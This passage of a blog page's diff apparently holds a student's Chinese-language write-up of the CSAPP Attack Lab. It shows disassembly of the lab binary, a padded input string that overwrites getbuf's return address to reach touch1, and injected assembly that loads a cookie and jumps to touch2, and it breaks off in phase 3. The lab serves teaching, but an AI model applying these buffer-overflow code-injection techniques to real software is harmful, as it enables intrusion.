+<path fill="currentColor" d="M244 84L255.1 96L267.1 84.02C300.6 51.37 347 36.51 392.6 44.1C461.5 55.58 512 115.2 512 185.1V190.9C512 232.4 494.8 272.1 464.4 300.4L283.7 469.1C276.2 476.1 266.3 480 256 480C245.7 480 235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1 0 232.4 0 190.9V185.1C0 115.2 50.52 55.58 119.4 44.1C164.1 36.51 211.4 51.37 244 84C243.1 84 244 84.01 244 84L244 84zM255.1 163.9L210.1 117.1C188.4 96.28 157.6 86.4 127.3 91.44C81.55 99.07 48 138.7 48 185.1V190.9C48 219.1 59.71 246.1 80.34 265.3L256 429.3L431.7 265.3C452.3 246.1 464 219.1 464 190.9V185.1C464 138.7 430.4 99.07 384.7 91.44C354.4 86.4 323.6 96.28 301.9 117.1L255.1 163.9z"/></svg>
+  </span>
+
+</span>
+        <span id="button_likes_text">&nbsp;Like</span>
+    </button>
+</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#代码注入攻击code-injection-attacks">代码注入攻击（Code Injection Attacks）</a></li>
+    <li><a href="#phase1">phase1:</a></li>
+    <li><a href="#phase2">phase2:</a></li>
+    <li><a href="#phase3">phase3:</a></li>
+    <li><a href="#返回导向编程return-oriented-programming">返回导向编程（Return-oriented Programming）</a></li>
+    <li><a href="#phase4">phase4:</a>
+      <ul>
+        <li><a href="#汇编指令的相关字节码">汇编指令的相关字节码：</a></li>
+        <li><a href="#这是它给我们的gadget表">这是它给我们的gadget表：</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase5">phase5:</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#代码注入攻击code-injection-attacks">代码注入攻击（Code Injection Attacks）</a></li>
+    <li><a href="#phase1">phase1:</a></li>
+    <li><a href="#phase2">phase2:</a></li>
+    <li><a href="#phase3">phase3:</a></li>
+    <li><a href="#返回导向编程return-oriented-programming">返回导向编程（Return-oriented Programming）</a></li>
+    <li><a href="#phase4">phase4:</a>
+      <ul>
+        <li><a href="#汇编指令的相关字节码">汇编指令的相关字节码：</a></li>
+        <li><a href="#这是它给我们的gadget表">这是它给我们的gadget表：</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase5">phase5:</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <blockquote>
+<p>本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。</p></blockquote>
+
+
+<h1 class="relative group">CSAPP:AttackLab 
+    <div id="csappattacklab" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#csappattacklab" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<blockquote>
+<p>[!WARNING]</p>
+<ol>
+<li>通过本实验，你将学习到利用安全性漏洞攻击操作系统和网络服务器的方法。本实验的目的是通过模拟攻击来增进对安全漏洞的理解和防范意识，了解安全漏洞的本质。本实验内容应仅用于学习目的，严禁用于任何非法或不道德的活动。</li>
+<li>本实验开始前，需要学习CS:APP3e第3.10.3节和第3.10.4节的知识。</li>
+<li><a href="https://arthals.ink/blog/attack-lab" target="_blank">https://arthals.ink/blog/attack-lab</a> 你还是可以参考这位的博客。</li>
+</ol></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">scp -p -r 2236115135-ics@x86.ics.xjtu-ants.net:./attacklab-2236115135-1235135 ~/ //scp下载远程服务器上的文件，如果要本地开发这是好的办法
+</span></span></code></pre></div><p>前三层是CI（代码注入攻击）攻击，后两层是ROP（返回导向编程）攻击。</p>
+
+
+<h2 class="relative group">代码注入攻击（Code Injection Attacks） 
+    <div id="%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BBcode-injection-attacks" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BBcode-injection-attacks" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h2 class="relative group">phase1: 
+    <div id="phase1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#phase1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000000401</span><span class="nf">a90</span> <span class="err">&lt;</span><span class="no">test</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a90:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">08</span>          	<span class="no">sub</span>    <span class="no">$0x8</span><span class="p">,</span><span class="nv">%rsp</span> <span class="c1">; 分配了八个字节的空间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">a94:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a99:</span>	<span class="nf">e8</span> <span class="mi">31</span> <span class="no">fe</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">4018cf</span> <span class="p">&lt;</span><span class="no">getbuf</span><span class="p">&gt;</span> <span class="c1">; 调用了getbuf函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">a9e:</span>	<span class="err">89</span> <span class="nf">c2</span>                	<span class="no">mov</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%edx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">aa0:</span>	<span class="nf">be</span> <span class="no">e8</span> <span class="mi">31</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x4031e8</span><span class="p">,</span><span class="nv">%esi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">aa5:</span>	<span class="nf">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">aaa:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">aaf:</span>	<span class="nf">e8</span> <span class="mi">3</span><span class="no">c</span> <span class="no">f2</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400cf0</span> <span class="p">&lt;</span><span class="no">__printf_chk@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ab4:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">c4</span> <span class="mi">08</span>          	<span class="no">add</span>    <span class="no">$0x8</span><span class="p">,</span><span class="nv">%rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ab8:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">00000000004018</span><span class="nf">cf</span> <span class="err">&lt;</span><span class="no">getbuf</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">cf:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">38</span>          	<span class="no">sub</span>    <span class="no">$0x38</span><span class="p">,</span><span class="nv">%rsp</span> <span class="c1">; 分配了56个字节的空间（在buf里）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">4018</span><span class="nl">d3:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">e7</span>             	<span class="no">mov</span>    <span class="nv">%rsp</span><span class="p">,</span><span class="nv">%rdi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">d6:</span>	<span class="nf">e8</span> <span class="mi">7</span><span class="no">e</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">call</span>   <span class="mh">401b59</span> <span class="p">&lt;</span><span class="no">Gets</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">db:</span>	<span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">e0:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">c4</span> <span class="mi">38</span>          	<span class="no">add</span>    <span class="no">$0x38</span><span class="p">,</span><span class="nv">%rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">e4:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">00000000004018</span><span class="nf">e5</span> <span class="err">&lt;</span><span class="no">touch1</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">e5:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">08</span>          	<span class="no">sub</span>    <span class="no">$0x8</span><span class="p">,</span><span class="nv">%rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">e9:</span>	<span class="nf">c7</span> <span class="mi">05</span> <span class="mi">2</span><span class="no">d</span> <span class="mi">2</span><span class="no">c</span> <span class="mi">20</span> <span class="mi">00</span> <span class="mi">01</span> 	<span class="no">movl</span>   <span class="no">$0x1</span><span class="p">,</span><span class="mi">0x202c2d</span><span class="p">(</span><span class="nv">%rip</span><span class="p">)</span>        <span class="c1"># 604520 &lt;vlevel&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">4018</span><span class="nl">f0:</span>	<span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">f3:</span>	<span class="nf">bf</span> <span class="mi">22</span> <span class="mi">31</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x403122</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">f8:</span>	<span class="nf">e8</span> <span class="mi">53</span> <span class="no">f4</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400d50</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">fd:</span>	<span class="nf">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401902:</span>	<span class="nf">e8</span> <span class="mi">92</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">call</span>   <span class="mh">401c99</span> <span class="p">&lt;</span><span class="no">validate</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401907:</span>	<span class="nf">bf</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40190</span><span class="nl">c:</span>	<span class="nf">e8</span> <span class="no">bf</span> <span class="no">f5</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400ed0</span> <span class="p">&lt;</span><span class="no">exit@plt</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>我要把return的地址覆盖成上面的touch1函数的首地址以执行touch1函数。</p>
+<p>那么直接构造如下的输入字符串即可，记得使用hex2raw工具。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>
+</span></span><span class="line"><span class="cl"><span class="nf">e5</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mi">00</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">phase2: 
+    <div id="phase2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#phase2" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>这里的操作就是：1.同理覆盖地址。2.你要传一个参数来执行你的代码。</p>
+<p>我要把覆盖的地址变成touch2,同时要传参数。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000000401911</span> <span class="err">&lt;</span><span class="nf">touch2</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401911:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">08</span>          	<span class="no">sub</span>    <span class="no">$0x8</span><span class="p">,</span><span class="nv">%rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401915:</span>	<span class="err">89</span> <span class="nf">fa</span>                	<span class="no">mov</span>    <span class="nv">%edi</span><span class="p">,</span><span class="nv">%edx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401917:</span>	<span class="nf">c7</span> <span class="mi">05</span> <span class="no">ff</span> <span class="mi">2</span><span class="no">b</span> <span class="mi">20</span> <span class="mi">00</span> <span class="mi">02</span> 	<span class="no">movl</span>   <span class="no">$0x2</span><span class="p">,</span><span class="mi">0x202bff</span><span class="p">(</span><span class="nv">%rip</span><span class="p">)</span>        <span class="c1"># 604520 &lt;vlevel&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">40191</span><span class="nl">e:</span>	<span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">401921:</span>	<span class="err">39</span> <span class="err">3</span><span class="nf">d</span> <span class="mi">01</span> <span class="mi">2</span><span class="no">c</span> <span class="mi">20</span> <span class="mi">00</span>    	<span class="no">cmp</span>    <span class="nv">%edi</span><span class="p">,</span><span class="mi">0x202c01</span><span class="p">(</span><span class="nv">%rip</span><span class="p">)</span>        <span class="c1"># 604528 &lt;cookie&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401927:</span>	<span class="err">75</span> <span class="err">20</span>                	<span class="nf">jne</span>    <span class="mh">401949</span> <span class="p">&lt;</span><span class="no">touch2</span><span class="p">+</span><span class="mi">0x38</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401929:</span>	<span class="nf">be</span> <span class="mi">48</span> <span class="mi">31</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x403148</span><span class="p">,</span><span class="nv">%esi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40192</span><span class="nl">e:</span>	<span class="nf">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401933:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401938:</span>	<span class="nf">e8</span> <span class="no">b3</span> <span class="no">f3</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400cf0</span> <span class="p">&lt;</span><span class="no">__printf_chk@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40193</span><span class="nl">d:</span>	<span class="nf">bf</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x2</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401942:</span>	<span class="nf">e8</span> <span class="mi">52</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">call</span>   <span class="mh">401c99</span> <span class="p">&lt;</span><span class="no">validate</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401947:</span>	<span class="nf">eb</span> <span class="mi">1</span><span class="no">e</span>                	<span class="no">jmp</span>    <span class="mh">401967</span> <span class="p">&lt;</span><span class="no">touch2</span><span class="p">+</span><span class="mi">0x56</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401949:</span>	<span class="nf">be</span> <span class="mi">70</span> <span class="mi">31</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x403170</span><span class="p">,</span><span class="nv">%esi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40194</span><span class="nl">e:</span>	<span class="nf">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401953:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401958:</span>	<span class="nf">e8</span> <span class="mi">93</span> <span class="no">f3</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400cf0</span> <span class="p">&lt;</span><span class="no">__printf_chk@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40195</span><span class="nl">d:</span>	<span class="nf">bf</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x2</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401962:</span>	<span class="nf">e8</span> <span class="no">f4</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">call</span>   <span class="mh">401d5b</span> <span class="p">&lt;</span><span class="no">fail</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401967:</span>	<span class="nf">bf</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40196</span><span class="nl">c:</span>	<span class="nf">e8</span> <span class="mi">5</span><span class="no">f</span> <span class="no">f5</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400ed0</span> <span class="p">&lt;</span><span class="no">exit@plt</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>过程：覆盖调用函数的返回地址来执行我的代码（这相当于是在stack上执行我的代码，你想这要怎么做到？把ret要覆盖的地址设置成分配之后的rsp的值，那么rip便会从这里开始执行代码，我们再将代码放进缓冲区，好妙的攻击技巧），我的代码把%rdi设置成我的cookie值，并且通过ret指令返回到touch2函数执行。</p>
+<p>在getbuf分配完了栈空间之后，%rsp = 0x5563c8d8,这也就是缓冲区的起始地址。</p>
+<p>我们构造：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">movq</span> <span class="no">$0x14e6646f</span><span class="p">,</span><span class="nv">%rdi</span> <span class="c1">; 把第一个参数设置成cookie值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">pushq</span> <span class="no">$0x00401911</span> <span class="c1">; 这里push进去一个touch2的首地址值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">ret</span> <span class="c1">; ret实际上就是把刚刚push进去的值拿出来然后跳转执行
+</span></span></span><span class="line"><span class="cl"><span class="c1">// gcc -c asm.s
+</span></span></span><span class="line"><span class="cl"><span class="c1">// objdump -d asm.o &gt; asm.byte 我们拿到这段汇编指令的字节码
+</span></span></span></code></pre></div>
+
+<h2 class="relative group">phase3: 
+    <div id="phase3" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#phase3" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>还是传参，但是会更麻烦，要调用更多的函数来解决这个问题,我要把我的cookie值作为一个string传给touch3。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000000401971</span> <span class="err">&lt;</span><span class="nf">hexmatch</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401971:</span>	<span class="err">41</span> <span class="err">54</span>                	<span class="nf">push</span>   <span class="nv">%r12</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401973:</span>	<span class="err">55</span>                   	<span class="nf">push</span>   <span class="nv">%rbp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401974:</span>	<span class="err">53</span>                   	<span class="nf">push</span>   <span class="nv">%rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401975:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">c4</span> <span class="mi">80</span>          	<span class="no">add</span>    <span class="no">$0xffffffffffffff80</span><span class="p">,</span><span class="nv">%rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401979:</span>	<span class="err">89</span> <span class="nf">fd</span>                	<span class="no">mov</span>    <span class="nv">%edi</span><span class="p">,</span><span class="nv">%ebp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40197</span><span class="nl">b:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">f3</span>             	<span class="no">mov</span>    <span class="nv">%rsi</span><span class="p">,</span><span class="nv">%rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40197</span><span class="nl">e:</span>	<span class="err">64</span> <span class="err">48</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">04</span> <span class="mi">25</span> <span class="mi">28</span> <span class="mi">00</span> 	<span class="no">mov</span>    <span class="nv">%fs</span><span class="p">:</span><span class="mi">0x28</span><span class="p">,</span><span class="nv">%rax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401985:</span>	<span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">401987:</span>	<span class="err">48</span> <span class="err">89</span> <span class="err">44</span> <span class="err">24</span> <span class="err">78</span>       	<span class="nf">mov</span>    <span class="nv">%rax</span><span class="p">,</span><span class="mi">0x78</span><span class="p">(</span><span class="nv">%rsp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40198</span><span class="nl">c:</span>	<span class="err">31</span> <span class="nf">c0</span>                	<span class="no">xor</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40198</span><span class="nl">e:</span>	<span class="nf">e8</span> <span class="no">bd</span> <span class="no">f4</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400e50</span> <span class="p">&lt;</span><span class="no">random@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401993:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">c1</span>             	<span class="no">mov</span>    <span class="nv">%rax</span><span class="p">,</span><span class="nv">%rcx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401996:</span>	<span class="err">48</span> <span class="nf">ba</span> <span class="mi">0</span><span class="no">b</span> <span class="no">d7</span> <span class="no">a3</span> <span class="mi">70</span> <span class="mi">3</span><span class="no">d</span> 	<span class="no">movabs</span> <span class="no">$0xa3d70a3d70a3d70b</span><span class="p">,</span><span class="nv">%rdx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40199</span><span class="nl">d:</span>	<span class="err">0</span><span class="nf">a</span> <span class="no">d7</span> <span class="no">a3</span> 
+</span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="no">a0</span><span class="p">:</span>	<span class="mi">48</span> <span class="no">f7</span> <span class="no">ea</span>             	<span class="no">imul</span>   <span class="nv">%rdx</span>
